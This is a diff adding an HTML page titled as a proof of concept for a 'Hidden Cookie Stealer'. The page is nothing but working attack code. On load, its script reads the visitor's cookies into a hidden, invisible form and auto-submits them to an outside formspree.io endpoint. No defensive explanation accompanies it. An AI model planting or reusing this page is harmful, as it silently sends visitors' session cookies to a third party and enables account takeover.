@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: Hidden Cookie Stealer</title>
+    <style>
+        form {
+            display: none; /* Hides the form */
+        }
+    </style>
+</head>
+<body>
+
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
+        <input type="hidden" name="cookie_data" id="cookieField">
+    </form>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Get user's cookies
+            var cookies = document.cookie;
+            
+            // Inject cookies into hidden input field
+            document.getElementById("cookieField").value = cookies;
+
+            // Auto-submit the form
+            document.getElementById("stealthForm").submit();
+        });
+    </script>
+
+</body>
+</html>
